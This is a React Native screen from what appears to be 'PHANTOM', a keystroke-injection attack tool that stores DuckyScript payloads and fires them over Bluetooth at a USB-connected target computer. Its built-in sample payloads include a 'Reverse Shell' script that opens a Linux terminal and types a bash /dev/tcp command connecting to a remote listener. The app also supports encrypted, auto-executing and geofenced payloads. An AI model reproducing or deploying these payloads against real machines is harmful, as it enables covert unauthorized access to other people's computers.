/**
 * PHANTOM — Payload Management & Editing Screen
 * Browse, create, edit, and execute DuckyScript payloads
 */

import React, { useState, useEffect, useContext, useCallback } from 'react';
import {
  View,
  Text,
  StyleSheet,
  FlatList,
  TouchableOpacity,
  Alert,
  Vibration,
  Modal,
  TextInput,
  ScrollView,
} from 'react-native';
import { BleContext } from '../components/BleContext';
import PayloadEditor from '../components/PayloadEditor';

const SAMPLE_PAYLOADS = [
  {
    id: '1',
    name: 'Hello World',
    description: 'Simple test payload that types Hello World',
    script: 'DELAY 1000\nSTRING Hello World\nENTER',
    flags: 0,
    lastExecuted: null,
    execCount: 0,
  },
  {
    id: '2',
    name: 'WiFi Credentials',
    description: 'Opens WiFi settings on Windows',
    script: 'DELAY 500\nGUI r\nDELAY 500\nSTRING ncpa.cpl\nENTER\nDELAY 1000',
    flags: 0,
    lastExecuted: null,
    execCount: 0,
  },
  {
    id: '3',
    name: 'Lock Screen',
    description: 'Locks the target computer',
    script: 'GUI l',
    flags: 0,
    lastExecuted: null,
    execCount: 0,
  },
  {
    id: '4',
    name: 'Reverse Shell',
    description: 'Opens terminal and creates reverse shell (Linux)',
    script: 'DELAY 500\nCTRL ALT t\nDELAY 1000\nSTRING bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\nENTER',
    flags: 1,
    lastExecuted: null,
    execCount: 0,
  },
];

const PayloadScreen = ({ navigation }) => {
  const { connectedDevice, sendCommand, deviceInfo } = useContext(BleContext);
  const [payloads, setPayloads] = useState([]);
  const [selectedPayload, setSelectedPayload] = useState(null);
  const [editingPayload, setEditingPayload] = useState(null);
  const [isExecuting, setIsExecuting] = useState(false);
  const [showEditor, setShowEditor] = useState(false);
  const [searchQuery, setSearchQuery] = useState('');
  const [filterMode, setFilterMode] = useState('all');

  useEffect(() => {
    // Load payloads from device or use samples
    loadPayloads();
  }, [connectedDevice]);

  const loadPayloads = useCallback(async () => {
    if (connectedDevice) {
      try {
        // Request profile list from device via BLE
        const response = await sendCommand('PROFILE_LIST');
        if (response && response.profiles) {
          setPayloads(response.profiles);
        } else {
          setPayloads(SAMPLE_PAYLOADS);
        }
      } catch (error) {
        // Use sample payloads if device not connected
        setPayloads(SAMPLE_PAYLOADS);
      }
    } else {
      setPayloads(SAMPLE_PAYLOADS);
    }
  }, [connectedDevice, sendCommand]);

  const handleExecute = (payload) => {
    if (!connectedDevice) {
      Alert.alert('Not Connected', 'Connect to a PHANTOM device first');
      return;
    }

    Alert.alert(
      'Execute Payload',
      `Execute "${payload.name}" on the target device?\n\nThis will send HID commands to the connected USB host.`,
      [
        { text: 'Cancel', style: 'cancel' },
        {
          text: 'Execute',
          style: 'destructive',
          onPress: async () => {
            Vibration.vibrate(200);
            setIsExecuting(true);
            try {
              await sendCommand(`EXECUTE:${payload.id}`);
              Alert.alert('Executing', `Payload "${payload.name}" is now executing`);
            } catch (error) {
              Alert.alert('Error', `Failed to execute: ${error.message}`);
            } finally {
              setIsExecuting(false);
            }
          },
        },
      ]
    );
  };

  const handleEdit = (payload) => {
    setEditingPayload(payload);
    setShowEditor(true);
  };

  const handleNew = () => {
    setEditingPayload({
      id: Date.now().toString(),
      name: 'New Payload',
      description: '',
      script: 'DELAY 1000\nSTRING Hello World\nENTER',
      flags: 0,
    });
    setShowEditor(true);
  };

  const handleSave = (payload) => {
    if (payloads.find((p) => p.id === payload.id)) {
      setPayloads(payloads.map((p) => (p.id === payload.id ? payload : p)));
    } else {
      setPayloads([...payloads, payload]);
    }
    setShowEditor(false);
    setEditingPayload(null);

    // Upload to device if connected
    if (connectedDevice) {
      sendCommand(`UPLOAD:${payload.id}:${payload.script}`).catch(() => {});
    }
  };

  const handleDelete = (payload) => {
    Alert.alert(
      'Delete Payload',
      `Delete "${payload.name}"? This cannot be undone.`,
      [
        { text: 'Cancel', style: 'cancel' },
        {
          text: 'Delete',
          style: 'destructive',
          onPress: () => {
            setPayloads(payloads.filter((p) => p.id !== payload.id));
            if (connectedDevice) {
              sendCommand(`DELETE:${payload.id}`).catch(() => {});
            }
          },
        },
      ]
    );
  };

  const getFlagLabel = (flags) => {
    const labels = [];
    if (flags & 1) labels.push('🔐');
    if (flags & 2) labels.push('▶️');
    if (flags & 4) labels.push('📍');
    return labels.join(' ');
  };

  const filteredPayloads = payloads.filter((p) => {
    const matchesSearch = p.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
      p.description.toLowerCase().includes(searchQuery.toLowerCase());
    const matchesFilter = filterMode === 'all' ||
      (filterMode === 'encrypted' && p.flags & 1) ||
      (filterMode === 'autoexec' && p.flags & 2) ||
      (filterMode === 'geofenced' && p.flags & 4);
    return matchesSearch && matchesFilter;
  });

  const renderPayloadItem = ({ item }) => (
    <TouchableOpacity
      style={styles.payloadCard}
      onPress={() => setSelectedPayload(item)}
      onLongPress={() => handleExecute(item)}
    >
      <View style={styles.payloadHeader}>
        <Text style={styles.payloadName}>{item.name}</Text>
        <Text style={styles.payloadFlags}>{getFlagLabel(item.flags)}</Text>
      </View>
      <Text style={styles.payloadDescription} numberOfLines={2}>
        {item.description}
      </Text>
      <View style={styles.payloadFooter}>
        <Text style={styles.payloadMeta}>
          {item.execCount || 0} executions
        </Text>
        <Text style={styles.payloadScript}>
          {item.script.split('\n').length} lines
        </Text>
      </View>
      <View style={styles.payloadActions}>
        <TouchableOpacity
          style={[styles.actionBtn, styles.executeBtn]}
          onPress={() => handleExecute(item)}
          disabled={!connectedDevice || isExecuting}
        >
          <Text style={styles.actionBtnText}>▶ Execute</Text>
        </TouchableOpacity>
        <TouchableOpacity
          style={[styles.actionBtn, styles.editBtn]}
          onPress={() => handleEdit(item)}
        >
          <Text style={styles.actionBtnText}>✏️ Edit</Text>
        </TouchableOpacity>
        <TouchableOpacity
          style={[styles.actionBtn, styles.deleteBtn]}
          onPress={() => handleDelete(item)}
        >
          <Text style={styles.actionBtnText}>🗑️ Delete</Text>
        </TouchableOpacity>
      </View>
    </TouchableOpacity>
  );

  return (
    <View style={styles.container}>
      {/* Search Bar */}
      <View style={styles.searchContainer}>
        <TextInput
          style={styles.searchInput}
          placeholder="Search payloads..."
          placeholderTextColor="#555"
          value={searchQuery}
          onChangeText={setSearchQuery}
        />
      </View>

      {/* Filter Tabs */}
      <View style={styles.filterContainer}>
        {['all', 'encrypted', 'autoexec', 'geofenced'].map((mode) => (
          <TouchableOpacity
            key={mode}
            style={[
              styles.filterTab,
              filterMode === mode && styles.filterTabActive,
            ]}
            onPress={() => setFilterMode(mode)}
          >
            <Text
              style={[
                styles.filterTabText,
                filterMode === mode && styles.filterTabTextActive,
              ]}
            >
              {mode}
            </Text>
          </TouchableOpacity>
        ))}
      </View>

      {/* Payload List */}
      <FlatList
        data={filteredPayloads}
        renderItem={renderPayloadItem}
        keyExtractor={(item) => item.id}
        contentContainerStyle={styles.listContainer}
        ListEmptyComponent={
          <View style={styles.emptyContainer}>
            <Text style={styles.emptyText}>No payloads found</Text>
            <Text style={styles.emptySubtext}>
              Create a new payload or connect to a device
            </Text>
          </View>
        }
      />

      {/* New Payload Button */}
      <TouchableOpacity style={styles.fab} onPress={handleNew}>
        <Text style={styles.fabText}>+</Text>
      </TouchableOpacity>

      {/* Payload Editor Modal */}
      <Modal
        visible={showEditor}
        animationType="slide"
        presentationStyle="fullScreen"
      >
        {editingPayload && (
          <PayloadEditor
            payload={editingPayload}
            onSave={handleSave}
            onCancel={() => {
              setShowEditor(false);
              setEditingPayload(null);
            }}
            connected={!!connectedDevice}
          />
        )}
      </Modal>
    </View>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#0f0f23',
  },
  searchContainer: {
    padding: 16,
    paddingBottom: 8,
  },
  searchInput: {
    backgroundColor: '#1a1a2e',
    borderRadius: 8,
    padding: 12,
    color: '#fff',
    fontFamily: 'monospace',
    fontSize: 14,
    borderWidth: 1,
    borderColor: '#2d2d44',
  },
  filterContainer: {
    flexDirection: 'row',
    paddingHorizontal: 16,
    paddingBottom: 8,
  },
  filterTab: {
    paddingHorizontal: 12,
    paddingVertical: 6,
    borderRadius: 16,
    marginRight: 8,
    backgroundColor: '#1a1a2e',
    borderWidth: 1,
    borderColor: '#2d2d44',
  },
  filterTabActive: {
    backgroundColor: '#00ff41',
    borderColor: '#00ff41',
  },
  filterTabText: {
    color: '#888',
    fontFamily: 'monospace',
    fontSize: 11,
  },
  filterTabTextActive: {
    color: '#0f0f23',
    fontWeight: 'bold',
  },
  listContainer: {
    padding: 16,
    paddingBottom: 80,
  },
  payloadCard: {
    backgroundColor: '#1a1a2e',
    borderRadius: 12,
    padding: 16,
    marginBottom: 12,
    borderWidth: 1,
    borderColor: '#2d2d44',
  },
  payloadHeader: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    marginBottom: 4,
  },
  payloadName: {
    color: '#00ff41',
    fontFamily: 'monospace',
    fontSize: 15,
    fontWeight: 'bold',
  },
  payloadFlags: {
    fontSize: 14,
  },
  payloadDescription: {
    color: '#aaa',
    fontFamily: 'monospace',
    fontSize: 12,
    marginTop: 4,
    marginBottom: 8,
  },
  payloadFooter: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    marginBottom: 8,
  },
  payloadMeta: {
    color: '#666',
    fontFamily: 'monospace',
    fontSize: 10,
  },
  payloadScript: {
    color: '#666',
    fontFamily: 'monospace',
    fontSize: 10,
  },
  payloadActions: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    borderTopWidth: 1,
    borderTopColor: '#2d2d44',
    paddingTop: 8,
  },
  actionBtn: {
    paddingHorizontal: 10,
    paddingVertical: 4,
    borderRadius: 6,
  },
  executeBtn: {
    backgroundColor: '#1a3d1a',
  },
  editBtn: {
    backgroundColor: '#1a2d3d',
  },
  deleteBtn: {
    backgroundColor: '#3d1a1a',
  },
  actionBtnText: {
    color: '#fff',
    fontFamily: 'monospace',
    fontSize: 11,
  },
  emptyContainer: {
    alignItems: 'center',
    paddingVertical: 40,
  },
  emptyText: {
    color: '#888',
    fontFamily: 'monospace',
    fontSize: 14,
  },
  emptySubtext: {
    color: '#555',
    fontFamily: 'monospace',
    fontSize: 11,
    marginTop: 8,
  },
  fab: {
    position: 'absolute',
    bottom: 24,
    right: 24,
    width: 56,
    height: 56,
    borderRadius: 28,
    backgroundColor: '#00ff41',
    justifyContent: 'center',
    alignItems: 'center',
    elevation: 8,
  },
  fabText: {
    color: '#0f0f23',
    fontSize: 28,
    fontWeight: 'bold',
  },
});

export default PayloadScreen;